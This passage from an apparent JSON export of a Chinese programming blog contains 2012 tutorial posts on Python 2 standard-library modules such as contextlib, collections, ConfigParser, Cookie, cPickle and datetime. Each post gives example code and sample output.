    "content": "<p>前言：这个模块主要用来将源文件编译成字节码文件</p>\n\n<p>假如想整个目录的编译成pyc文件，那么可以这样用：</p>\n\n<p><pre class=\"sh_python\">\nimport compileall\nimport re</p>\n\n<p>compileall.compile_dir('examples',   #要编译当面目录下的examples目录\n    rx=re.compile(r'/\\.svn'))  #'rx'自动了一个排除目录， 不编译.svn目录下的文件\n</pre></p>\n\n<p>注：以上的也可以使用命令行;</p>\n\n<p>python -m compileall -x '/\\.svn' examples</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 161,
    "title": "关于contextlib研究",
    "category": "python模块研究",
    "tags": [
      "contextlib",
      "contextlib.nested"
    ],
    "url": "/archives/guanyucontextlibyanjiu/",
    "content": "<p>前言：本模块在python2.5及以上版本可用，主要用来上下文管理</p>\n\n<p>看一个其他的例子：</p>\n\n<p><pre class=\"sh_python\">\nclass WithinContext(object):</p>\n\n<p>    def __init__(self, context):\n        print 'WithinContext.__init__(%s)' % context</p>\n\n<p>    def do_something(self):\n        print 'WithinContext.do_something()'</p>\n\n<p>    def __del__(self):\n        print 'WithinContext.__del__'</p>\n\n<p>class Context(object):</p>\n\n<p>    def __init__(self):\n        print 'Context.__init__()'</p>\n\n<p>    def __enter__(self):   #返回一个上下文内使用的对象\n        print 'Context.__enter__()'\n        return WithinContext(self)</p>\n\n<p>    def __exit__(self, exc_type, exc_val, exc_tb):  #清理正在用的资源\n        print 'Context.__exit__()'</p>\n\n<p>with Context() as c:\n    c.do_something()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python !$\npython test.py\nContext.__init__()\nContext.__enter__()\nWithinContext.__init__(&lt;__main__.Context object at 0xb749c94c&gt;)\nWithinContext.do_something()\nContext.__exit__()\nWithinContext.__del__</p>\n\n<p><strong>1 使用contextlib：</strong></p>\n\n<p><pre class=\"sh_python\">\nimport contextlib</p>\n\n<p>@contextlib.contextmanager #使用装饰器自动写一个带 <tt>__enter__()</tt> <tt>和 __exit__()</tt> 的类\ndef make_context():\n    print 'entering'\n    try:\n        yield {}\n    finally:\n        print 'exiting'\nwith make_context() as value:\n    print 'inside with statement:', value\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nentering\ninside with statement: {}\nexiting</p>\n\n<p><strong>2嵌套上下文</strong></p>\n\n<p><pre class=\"sh_python\">\nimport contextlib</p>\n\n<p>@contextlib.contextmanager\ndef make_context(name):\n    print 'entering',name\n    yield name\n    print 'exiting',name\nwith contextlib.nested(make_context('A'), make_context('B'), make_context('C')) as (A, B, C):  #同时管理三个上下文\n    print 'inside with statement:', A,B,C\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nentering A\nentering B\nentering C\ninside with statement: A B C\nexiting C\nexiting B\nexiting A\n注python2.7及更高，with关键字已经支持嵌套可以这样：\nwith make_context('A') as A, make_context('B') as B, make_context('C') as C:\n    print 'inside with statement:', A, B, C\n<strong>3 关闭打开的句柄</strong>\n为了确保一个句柄被关闭，使用<tt>closing()</tt>\n<pre class=\"sh_python\">\ncat test.py\nimport contextlib</p>\n\n<p>class Door(object):\n    def __init__(self):\n        print '__init__()'\n    def close(self):\n        print 'close()'</p>\n\n<p>with contextlib.closing(Door()) as door:\n    print 'inside with statement'\n</pre>\n执行过程：\ndongwm@linux-dongwm:~&gt; python test.py\n__init__()\ninside with statement\nclose()</p>\n\n<p></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 162,
    "title": "关于urlparse研究",
    "category": "python模块研究",
    "tags": [
      "urlparse"
    ],
    "url": "/archives/guanyuurlparseyanjiu/",
    "content": "<p>前言：urlparse是一个用来解析http的url的模块</p>\n\n<p>例子：</p>\n\n<p><pre class=\"sh_python\">\nimport urlparse\nurl = 'http://user:pass@NetLoc:80/path;parameters?query=argument#fragment'  #这个是设计的一个url\nparsed = urlparse.urlparse(url)   #urlparse.urlparse和urlparse.<tt>urlsplit的区别主要在path，后者不会分裁url的path地址</tt>\nprint 'scheme  :', parsed.scheme  #url的协议\nprint 'netloc  :', parsed.netloc  #服务器地址\nprint 'path    :', parsed.path #url的路径\nprint 'params  :', parsed.params #url中的参数和值\nprint 'query   :', parsed.query #url的查询部分\nprint 'fragment:', parsed.fragment #url的分片部分\nprint 'username:', parsed.username #url登录用户的用户名称\nprint 'password:', parsed.password #url登录用户的密码\nprint 'hostname:', parsed.hostname, '(netloc in lower case)'  #url的主机名，自动转化成小写\nprint 'port    :', parsed.port\n</pre></p>\n\n<p>结果是：</p>\n\n<p>scheme  : http\nnetloc  : user:pass@NetLoc:80\npath    : /path  #假如是urlparse.<tt>urlsplit</tt>，结果为：/path;parameters\nparams  : parameters  # #假如是urlparse.<tt>urlsplit</tt>，没有params\nquery   : query=argument\nfragment: fragment\nusername: user\npassword: pass\nhostname: netloc (netloc in lower case)\nport    : 80</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 163,
    "title": "关于cProfile,pstats研究",
    "category": "python模块研究",
    "tags": [

    ],
    "url": "/archives/guanyu-2/",
    "content": "<p>前言：profile, cProfile, pstats是三个python程序性能分析的模块，cProfile和Profile显示消耗处理器资源的收集和分析统计</p>\n\n<p><pre class=\"sh_python\">\n#coding=utf-8\ndef test1():\n    sum = 0\n    for i in range(10000):\n        sum += i\n    sumA = test2()\n    sumB = test2()\n    return sum</p>\n\n<p>def test2():\n    sum = 0\n    for i in range(100000):\n        sum += i\n    return sum</p>\n\n<p>if __name__ == \"__main__\":\n    import cProfile\n    cProfile.run(\"test1()\")   #直接把分析结果打印到控制台\n    cProfile.run(\"test1()\", \"result\") #把分析结果保存到文件中,不过内容可读性差...需要调用pstats模块分析结果\n    import pstats\n    p = pstats.Stats(\"result\") #创建Stats对象\n    p.strip_dirs().sort_stats(-1).print_stats()  #这一行的效果和直接运行cProfile.run(\"test1()\")的显示效果是一样的\n    #strip_dirs():从所有模块名中去掉无关的路径信息\n    #sort_stats():把打印信息按照标准的module/name/line字符串进行排序\n    #print_stats():打印出所有分析信息\n    p.strip_dirs().sort_stats(\"name\").print_stats() #按照函数名排序\n    #按照在一个函数中累积的运行时间进行排序\n    #print_stats(3):只打印前3行函数的信息,参数还可为小数,表示前百分之几的函数信息\n    p.strip_dirs().sort_stats(\"cumulative\").print_stats(3)\n    #还有一种用法\n    p.sort_stats('time', 'cum').print_stats(.5, 'test1')\n    #先按time排序,再按cumulative时间排序,然后打倒出前50%中含有函数信息\n    p.print_callers(0.5, \"test2\") #如果想知道有哪些函数调用了test2\n    p.print_callees(\"test1\") #查看test1()函数中调用了哪些函数\n</pre></p>\n\n<p>运行的结果的一部分：</p>\n\n<p>9 function calls in 0.045 CPU seconds  #9次函数调用</p>\n\n<p>Ordered by: standard name</p>\n\n<p>ncalls  tottime  percall  cumtime  percall filename:lineno(function)\n1    0.000    0.000    0.045    0.045 &lt;string&gt;:1(&lt;module&gt;)\n1    0.000    0.000    0.045    0.045 cProfile.py:132(run)\n1    0.000    0.000    0.045    0.045 cProfile.py:137(runctx)\n1    0.000    0.000    0.045    0.045 cProfile.py:14(run)\n1    0.000    0.000    0.000    0.000 cProfile.py:5(&lt;module&gt;)\n1    0.000    0.000    0.000    0.000 cProfile.py:66(Profile)\n1    0.000    0.000    0.045    0.045 test.py:2(&lt;module&gt;)\n1    0.000    0.000    0.045    0.045 {execfile}\n1    0.045    0.045    0.045    0.045 {method 'enable' of '_lsprof.Profiler' objects}\n注：按列，第一列加起来是9，第二列表示运行时间是0.045，第三列是运行时间除以次数，第四列表示总共运行时间，包含内部所有其他函数运行总时间，</p>\n\n<p>第五列是总共运行时间除以次数，第六列表名某函数或者文件调用</p>\n\n<p>注2：可以使用命令行执行：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python -m cProfile test.py -o result  #result 这个文件是运行cProfile.run()得到的数据文件</p>\n\n<p>注3：runctx()是在使用复杂表达式的时候使用</p>\n\n<p>当然 还有数据的可视化：</p>\n\n<p><a href=\"http://code.google.com/p/jrfonseca/wiki/Gprof2Dot\" rel=\"nofollow\" target=\"_blank\">Gprof2Dot</a>可将多种Profiler的数据转成<a title=\"Graphviz（尚未撰写）\" href=\"http://linux-wiki.cn/index.php?title=Graphviz&amp;action=edit&amp;redlink=1\">Graphviz</a>可处理的图像表述。配合dot命令，即可得到不同函数所消耗的时间分析图。</p>\n\n<p>dongwm@linux-dongwm:~/jrfonseca.gprof2dot&gt; ./gprof2dot.py -f pstats ../result | dot -Tpng -o output.png\n效果图：</p>\n\n<p><img class=\"alignnone\" title=\" \" src=\"http://pic.yupoo.com/dongweiming/C2erL22f/13ZkRd.png\" alt=\"\" width=\"168\" height=\"507\" /></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 164,
    "title": "关于collections研究",
    "category": "python模块研究",
    "tags": [
      "collections",
      "Counter",
      "defaultdict",
      "Deque",
      "namedtuple",
      "OrderedDict"
    ],
    "url": "/archives/guanyucollectionsyanjiu/",
    "content": "<p>前言：collections包含了超出内置的列表，字典，元组的数据类型的集合</p>\n\n<p><strong>1 Counter是一种容器，计算等效值累加，类似于对字典的key的value叠加</strong></p>\n\n<p><pre class=\"sh_python\">\nimport collections\nc = collections.Counter()  #设置容器\nprint 'Initial :', c\nc.update('abcdaab')  #更新容器\nprint 'Sequence:', c\nc.update({'a':1, 'd':5})\nprint 'Dict    :', c\n</pre></p>\n\n<p>结果：</p>\n\n<p>python test.py\nInitial : Counter()\nSequence: Counter({'a': 3, 'b': 2, 'c': 1, 'd': 1})   #计算更新的字母的数量\nDict    : Counter({'d': 6, 'a': 4, 'b': 2, 'c': 1}) #因为继续更新字典，把key的value叠加</p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>c = collections.Counter()\nwith open('/var/lib/dict/words', 'rt') as f:   #读取系统的字典文件，我的是opensuse\n    for line in f:\n        c.update(line.rstrip().lower())  每次更新一行，也就是一个词</p>\n\n<p>print 'Most common:'\nfor letter, count in c.most_common(3):  #选取叠加数量最大的前三位的字母\n    print '%s: %7d' % (letter, count)  #打印 这个字母 和数量\n</pre>\n计算结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nMost common:\ns:  366873\ne:  366053\ni:  288936</p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>c1 = collections.Counter(['o', 'd', 'd', 'a', 'c', 'd'])\nc2 = collections.Counter('aiodn')</p>\n\n<p>print 'C1:', c1\nprint 'C2:', c2</p>\n\n<p>print '\\nCombined counts:'   #2个容器累加\nprint c1 + c2</p>\n\n<p>print '\\nSubtraction:'  #2个容器相减\nprint c1 - c2</p>\n\n<p>print '\\nIntersection (taking positive minimums):'  #2个容器取同\nprint c1 &amp; c2</p>\n\n<p>print '\\nUnion (taking maximums):'  #2个容器取异\nprint c1 | c2\n</pre></p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nC1: Counter({'d': 3, 'a': 1, 'c': 1, 'o': 1})\nC2: Counter({'a': 1, 'i': 1, 'd': 1, 'o': 1, 'n': 1})</p>\n\n<p>Combined counts:\nCounter({'d': 4, 'a': 2, 'o': 2, 'c': 1, 'i': 1, 'n': 1})</p>\n\n<p>Subtraction:\nCounter({'d': 2, 'c': 1})</p>\n\n<p>Intersection (taking positive minimums):\nCounter({'a': 1, 'd': 1, 'o': 1})</p>\n\n<p>Union (taking maximums):\nCounter({'d': 3, 'a': 1, 'c': 1, 'i': 1, 'o': 1, 'n': 1})\n<strong>2defaultdict 设置一个包含默认值的字典（不存在key就用这个默认值）</strong></p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>def default_factory():\n    return 'default value'</p>\n\n<p>d = collections.defaultdict(default_factory, foo='bar')\nprint 'd:', d\nprint 'foo =&gt;', d['foo']\nprint 'bar =&gt;', d['bar']\n</pre></p>\n\n<p>结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nd: defaultdict(&lt;function default_factory at 0xb74d2c34&gt;, {'foo': 'bar'})\nfoo =&gt; bar\nbar =&gt; default value\n<strong>3 Deque 一个 double-ended 的 queue，可以从任何一端等价和删除元素</strong></p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>d = collections.deque('abcdefg')\nprint 'Deque:', d\nprint 'Length:', len(d)\nprint 'Left end:', d[0]\nprint 'Right end:', d[-1]</p>\n\n<p>d.remove('c')\nprint 'remove(c):', d\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nDeque: deque(['a', 'b', 'c', 'd', 'e', 'f', 'g'])\nLength: 7\nLeft end: a\nRight end: g\nremove(c): deque(['a', 'b', 'd', 'e', 'f', 'g'])\n<pre class=\"sh_python\">\nimport collections</p>\n\n<p>d = collections.deque()\nd.extend('abcdefg')\nprint 'extend    :', d\nd.append('h')\nprint 'append    :', d</p>\n\n<p>d = collections.deque()\nd.extendleft('abcdefg')\nprint 'extendleft:', d\nd.appendleft('h')\nprint 'appendleft:', d\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nextend    : deque(['a', 'b', 'c', 'd', 'e', 'f', 'g'])  #延长队列\nappend    : deque(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'])  #增加一个 自动在队列尾部\nextendleft: deque(['g', 'f', 'e', 'd', 'c', 'b', 'a']) #从右向左放队列\nappendleft: deque(['h', 'g', 'f', 'e', 'd', 'c', 'b', 'a']) #增加一个 从左端开始添加\n<pre class=\"sh_python\">\nimport collections</p>\n\n<p>print 'From the right:'\nd = collections.deque('abcdefg')\nwhile True:\n    try:\n        print d.pop()  #删除默认从队尾开始\n    except IndexError: #队列为空 停止\n        break</p>\n\n<p>print '\\nFrom the left:'\nd = collections.deque('abcdefg')\nwhile True:\n    try:\n        print d.popleft()  #删除从左开始\n    except IndexError:\n        break\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nFrom the right:\ng\nf\ne\nd\nc\nb\na</p>\n\n<p>From the left:\na\nb\nc\nd\ne\nf\ng</p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>d = collections.deque(xrange(10))\nprint 'Normal        :', d\nd = collections.deque(xrange(10))\nd.rotate(2)   #旋转2个数据，把最右边的2个 转到最左面\nprint 'Right rotation:', d\nd = collections.deque(xrange(10))\nd.rotate(-2) #把最左边2个转到最右边\nprint 'Left rotation :', d\n</pre>\n执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nNormal        : deque([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\nRight rotation: deque([8, 9, 0, 1, 2, 3, 4, 5, 6, 7])\nLeft rotation : deque([2, 3, 4, 5, 6, 7, 8, 9, 0, 1])\n<strong>4 namedtuple</strong></p>\n\n<p>元组使用位置确定数据，看一个题外例子：</p>\n\n<p><pre class=\"sh_python\">\ndongwm = ('Dongwm', 27, 'male')\nliuliu = ('Liuliu', 29, 'female')\nfor p in [ dongwm, liuliu ]:\n    print '%s is a %d year old %s' % p   #这里有三个格式化%s，只有一个p 但是p有三个值\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nDongwm is a 27 year old male\nLiuliu is a 29 year old female</p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>Person = collections.namedtuple('Person', 'name age gender')</p>\n\n<p>print 'Type of Person:', type(Person)\ndongwm = Person(name='Dongwm', age=27, gender='male')\nliuliu = Person(name='Liuliu', age=29, gender='female')\nfor p in [ dongwm, liuliu ]:\n    print '%s is a %d year old %s' % p\n</pre>\n执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nType of Person: &lt;type 'type'&gt;\nDongwm is a 27 year old male\nLiuliu is a 29 year old female\n5 OrderedDict 是一本字典的子类，记得被添加的顺序</p>\n\n<p><pre class=\"sh_python\">\nimport collections</p>\n\n<p>print 'Regular dictionary:'\nd = {}\nd['a'] = 'A'\nd['b'] = 'B'\nd['c'] = 'C'\nd['d'] = 'D'\nd['e'] = 'E'</p>\n\n<p>for k, v in d.items():\n    print k, v</p>\n\n<p>print '\\nOrderedDict:'\nd = collections.OrderedDict()\nd['a'] = 'A'\nd['b'] = 'B'\nd['c'] = 'C'\nd['d'] = 'D'\nd['e'] = 'E'</p>\n\n<p>for k, v in d.items():\n    print k, v\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>python test.py\nRegular dictionary:\na A\nc C\nb B\ne E\nd D</p>\n\n<p>OrderedDict:\na A\nb B\nc C\nd D\ne E</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 165,
    "title": "关于ConfigParser研究",
    "category": "python模块研究",
    "tags": [
      "ConfigParser",
      "SafeConfigParser"
    ],
    "url": "/archives/guanyuconfigparseryanjiu/",
    "content": "<p>前言：ConfigParser很经常使用，主要是解析和修改类似于windows的ini文件的模块。，配置项使用［］，每个具体项为 key=value，这里有个配置例子(test.cfg)：\n<pre class=\"sh_ini\">\n[test]\nurl = http://localhost:8080\nusername = dongwm\npassword = passwd\n</pre>\n<pre class=\"sh_python\">\nfrom ConfigParser import SafeConfigParser  #建议不要用子类ConfigParser\nparser = SafeConfigParser()\nparser.read('test.cfg')  #加载要分析的配置文件\nprint parser.get('test', 'url')  #获取 test 端 key为‘url’的值\n</pre>\n注：read（）支持多个配置文件：\n<pre class=\"sh_python\">\nfrom ConfigParser import SafeConfigParser\nparser = SafeConfigParser()\nlist = ['does_not_exist.cfg', 'also-does-not-exist.cfg','test.cfg' ]\nfound = parser.read(list)</p>\n\n<p>missing = set(list) - set(found)</p>\n\n<p>print 'Found config files:', sorted(found)\nprint 'Missing files     :', sorted(missing)\n</pre>\ndongwm@linux-dongwm:~&gt; python test.py\nFound config files: ['test.cfg']\nMissing files     : ['also-does-not-exist.cfg', 'does_not_exist.cfg']\n注2：假如配置文件有其他不可被直接识别的字符呢：\ndongwm@linux-dongwm:~&gt; cat !$\ncat test.cfg\n[test]\nurl = http://localhost:8080\nusername = dongwm\npassword = ßéç®é†\n<pre class=\"sh_python\">\nfrom ConfigParser import SafeConfigParser\nimport codecs</p>\n\n<p>parser = SafeConfigParser()</p>\n\n<p>with codecs.open('test.cfg', 'r', encoding='utf-8') as f:\n    parser.readfp(f)</p>\n\n<p>password = parser.get('test', 'password')</p>\n\n<p>print 'Password:', password.encode('utf-8')\nprint 'Type    :', type(password)\nprint 'repr()  :', repr(password)\n</pre>\n执行结果：\ndongwm@linux-dongwm:~&gt; python test.py\nPassword: ßéç®é†\nType    : &lt;type 'unicode'&gt;\nrepr()  : u'\\xdf\\xe9\\xe7\\xae\\xe9\\u2020'\n<pre class=\"sh_python\">\nfrom ConfigParser import SafeConfigParser</p>\n\n<p>parser = SafeConfigParser()\nparser.read('test.cfg')</p>\n\n<p>for candidate in [ 'test-1', 'test' ]:\n    print '%-12s: %s' % (candidate, parser.has_section(candidate))  #has_section 判断是不是有这个setion 没有为 false\n</pre>\ndongwm@linux-dongwm:~&gt; python test.py\ntest-1      : False\ntest        : True</p>\n\n<p><pre class=\"sh_python\">\nimport ConfigParser\nimport sys\nparser = ConfigParser.SafeConfigParser()</p>\n\n<p>parser.add_section('test')  #添加一个setion\nparser.set('test', 'url', 'http://localhost:8080')\nparser.set('test', 'username', 'dongwm')\nparser.set('test', 'password', 'passwd')</p>\n\n<p>for section in parser.sections():\n    print section\n    for name, value in parser.items(section):\n        print '  %s = %r' % (name, value)\nparser.remove_option('test', 'password') #移出一个option  也可以使用 remove_section 移出整个section\nprint '\\nModified values:\\n'\nfor section in parser.sections():\n    print section\n    for name, value in parser.items(section):\n        print '  %s = %r' % (name, value)\nprint '\\nSave :\\n'\nparser.write(sys.stdout)   #修改了只是临时的想要保存下来必须使用write\n</pre>\n执行过程：\ndongwm@linux-dongwm:~&gt; python test.py\ntest\n  url = 'http://localhost:8080'\n  username = 'dongwm'\n  password = 'passwd'</p>\n\n<p>Modified values:</p>\n\n<p>test\n  url = 'http://localhost:8080'\n  username = 'dongwm'</p>\n\n<p>Save :</p>\n\n<p>[test]\nurl = http://localhost:8080\nusername = dongwm</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 166,
    "title": "关于cookie研究",
    "category": "python模块研究",
    "tags": [
      "cookie"
    ],
    "url": "/archives/guanyucookieyanjiu/",
    "content": "<p>前言：cookie主要用于解析和创建HTTP Cookie标头的模块，cookie通常是用来对站点管理，由服务器存储，客户端返回</p>\n\n<p><pre class=\"sh_python\">\nimport Cookie\nimport datetime</p>\n\n<p>c = Cookie.SimpleCookie()  </p>\n\n<p>c['encoded_value_cookie'] = '\"cookie_value\"'\nc['encoded_value_cookie']['comment'] = 'Notice that this cookie value has escaped quotes'  #cookie 的目标用途,客户端可以检查此注释，并决定是否接受此 cookie</p>\n\n<p>c['restricted_cookie'] = 'cookie_value'\nc['restricted_cookie']['path'] = '/some/path' #<span style=\"font-family: 宋体,宋体,宋体;\">则 cookie 将只发送到对该路径的请求中。如果未设置该属性，则使用应用程序的路径</span>\nc['restricted_cookie']['domain'] = 'dongwm'  #<span style=\"font-family: 宋体,宋体,宋体;\">cookie 将被发送到对该域的请求中去</span>\nc['restricted_cookie']['secure'] = True #<span style=\"font-family: 宋体,宋体,宋体;\">指定 cookie 是否安全</span> 为真时，cookie 只能通过安全通道传输（目前即SSL通道）。否则，浏览器将忽略此Cookie</p>\n\n<p>c['with_max_age'] = 'expires in 5 minutes'\nc['with_max_age']['max-age'] = 300  #用秒来设置cookie的生存期</p>\n\n<p>c['expires_at_time'] = 'cookie_value'\nexpires = datetime.datetime(2013, 2, 14, 00, 30, 12) + datetime.timedelta(hours=1)\nc['expires_at_time']['expires'] = expires.strftime('%a, %d %b %Y %H:%M:%S') #<span style=\"font-family: 宋体,宋体,宋体;\">cookie 的过期日期。为了在会话结束后将 cookie 存储在客户端磁盘上，必须设置该日期。\n #若此项属性的设置未超过当前日期，则在任务结束后 cookie 将到期</span>\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport Cookie</p>\n\n<p>HTTP_COOKIE = r'integer=5; string_with_quotes=\"He said, \\\"Hello, World!\\\"\"'</p>\n\n<p>print 'From constructor:'\nc = Cookie.SimpleCookie(HTTP_COOKIE)\nprint c</p>\n\n<p>print\nprint 'From load():'\nc = Cookie.SimpleCookie()\nc.load(HTTP_COOKIE) #接受解析cookie\nprint c\n</pre></p>\n\n<p>操作过程：</p>\n\n<p>From constructor:\nSet-Cookie: integer=5\nSet-Cookie: string_with_quotes=\"He said, \\\"Hello, World!\\\"\"</p>\n\n<p>From load():\nSet-Cookie: integer=5\nSet-Cookie: string_with_quotes=\"He said, \\\"Hello, World!\\\"\"</p>\n\n<p><pre class=\"sh_python\">\nimport Cookie\nc = Cookie.SimpleCookie()\nc['mycookie'] = 'cookie_value'\nc['another_cookie'] = 'second value'\nprint c.js_output() #除了使用Set-Cookie头，它是可以使用JavaScript将Cookie添加到客户端\n</pre>\n结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py</p>\n\n<p>&lt;script type=\"text/javascript\"&gt;\n&lt;!-- begin hiding\ndocument.cookie = \"another_cookie=\\\"second value\\\"\";\n// end hiding --&gt;\n&lt;/script&gt;</p>\n\n<p>&lt;script type=\"text/javascript\"&gt;\n&lt;!-- begin hiding\ndocument.cookie = \"mycookie=cookie_value\";\n// end hiding --&gt;\n&lt;/script&gt;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 167,
    "title": "关于cPickle研究",
    "category": "python模块研究",
    "tags": [
      "cPickle",
      "Pickle"
    ],
    "url": "/archives/guanyucpickleyanjiu/",
    "content": "<p>前言：cPickle是一个让python对象序列化的模块，什么是序列化？比如内存里面有个数据结构想保存，重用甚至发送给别人（比如游戏保存配置，下次登录游戏还是在上次的那个场景的意思一样），为什么这里只说cPickle？它是Pickle在python中以C的形式实现，性能快很多倍（算法其实一样），但是假如在进程间通信或者存储，数据是不安全的</p>\n\n<p><pre class=\"sh_python\">\ntry:\n    import cPickle as pickle\nexcept:\n    import pickle\nimport pprint #这个模块将数据格式化显示了</p>\n\n<p>data1 = [ { 'a':'A', 'b':2, 'c':3.0 } ]\nprint 'BEFORE:',\npprint.pprint(data1)</p>\n\n<p>data1_string = pickle.dumps(data1)  #使用dump编码 类似于json\npprint.pprint(data1_string)\ndata2 = pickle.loads(data1_string)  #使用load解码\nprint 'AFTER:',\npprint.pprint(data2)</p>\n\n<p>print 'SAME?:', (data1 is data2)\nprint 'EQUAL?:', (data1 == data2)\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nBEFORE:[{'a': 'A', 'b': 2, 'c': 3.0}]</p>\n\n<p>\"(lp1\\n(dp2\\nS'a'\\nS'A'\\nsS'c'\\nF3\\nsS'b'\\nI2\\nsa.\"\nAFTER:[{'a': 'A', 'b': 2, 'c': 3.0}]\nSAME?: False  #前后数据相同，但是不占用同样的内存位置\nEQUAL?: True\n<pre class=\"sh_python\">\ntry:\n    import cPickle as pickle\nexcept:\n    import pickle\nimport pprint\nfrom StringIO import StringIO</p>\n\n<p>class SimpleObject(object):</p>\n\n<p>    def __init__(self, name):\n        self.name = name\n        l = list(name)\n        l.reverse()\n        self.name_backwards = ''.join(l)\n        return</p>\n\n<p>data = []\ndata.append(SimpleObject('pickle')) #添加多个对象  \ndata.append(SimpleObject('cPickle'))\ndata.append(SimpleObject('last'))</p>\n\n<p>out_s = StringIO() </p>\n\n<p>for o in data:\n    print 'WRITING: %s (%s)' % (o.name, o.name_backwards)\n    pickle.dump(o, out_s)\n    out_s.flush()</p>\n\n<p>in_s = StringIO(out_s.getvalue()) #写入流中多个对象</p>\n\n<p>while True:\n    try:\n        o = pickle.load(in_s) #从流中读取，而不需要事先知道对象多大多少\n    except EOFError:\n        break\n    else:\n        print 'READ: %s (%s)' % (o.name, o.name_backwards)\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nWRITING: pickle (elkcip)\nWRITING: cPickle (elkciPc)\nWRITING: last (tsal)\nREAD: pickle (elkcip)\nREAD: cPickle (elkciPc)\nREAD: last (tsal)</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 168,
    "title": "关于cStringIO研究",
    "category": "linux基础",
    "tags": [
      "cStringIO",
      "StringIO"
    ],
    "url": "/archives/guanyucstringioyanjiu/",
    "content": "<p>前言：cStringIO的行为与file对象非常像，但它不是磁盘上文件，而是一个内存里的“文件”，我们可以将操作磁盘文件那样来操作cStringIO，经常被用来作为字符串的缓存，因为StringIO有个好处，他的有些接口和文件操作是一致的</p>\n\n<p><pre class=\"sh_python\">\n#coding=utf-8\ntry:\n    from cStringIO import StringIO\nexcept:\n    from StringIO import StringIO</p>\n\n<p>output = StringIO()\noutput.write('This goes into the buffer. ') #写到内存缓存里面\nprint &gt;&gt;output, 'And so does this.'\nprint output.getvalue() #找到缓存结果\noutput.close() #放弃内存中的缓存</p>\n\n<p>input = StringIO('Inital value for read buffer') #初始化一个缓存区</p>\n\n<p>print input.read() # 读取缓存区内容\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nThis goes into the buffer. And so does this.</p>\n\n<p>Inital value for read buffer\n注：还可以使用<tt>readline()</tt>和<tt>readlines()</tt>，也可以使用seek()</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 169,
    "title": "关于datetime研究",
    "category": "python模块研究",
    "tags": [
      "datetime"
    ],
    "url": "/archives/guanyudatetimeyanjiu/",
    "content": "<p>前言：datetime是一个日期/时间值操作的模块</p>\n\n<p><pre class=\"sh_python\">\nimport datetime</p>\n\n<p>t = datetime.time(1, 2, 3)  #这事一个关于时间的调用\nprint t\nprint 'hour  :', t.hour \nprint 'minute:', t.minute\nprint 'second:', t.second\nprint 'microsecond:', t.microsecond\nprint 'tzinfo:', t.tzinfo\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport datetime</p>\n\n<p>today = datetime.date.today()  #这是一个关于日期的调用\nprint today\nprint 'ctime:', today.ctime()\nprint 'tuple:', today.timetuple()\nprint 'ordinal:', today.toordinal()\nprint 'Year:', today.year\nprint 'Mon :', today.month\nprint 'Day :', today.day\nd1 = datetime.date(2008, 3, 12)\nprint 'd1:', d1\nd2 = d1.replace(year=2009)\nprint 'd2:', d2\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n2012-06-12\nctime: Tue Jun 12 00:00:00 2012\ntuple: time.struct_time(tm_year=2012, tm_mon=6, tm_mday=12, tm_hour=0, tm_min=0, tm_sec=0, tm_wday=1, tm_yday=164, tm_isdst=-1)\nordinal: 734666\nYear: 2012\nMon : 6\nDay : 12</p>\n\n<p>d1: 2008-03-12\nd2: 2009-03-12</p>\n\n<p><pre class=\"sh_python\">\nimport datetime</p>\n\n<p>today = datetime.date.today()  #计算今天\nprint 'Today    :', today</p>\n\n<p>one_day = datetime.timedelta(days=1) 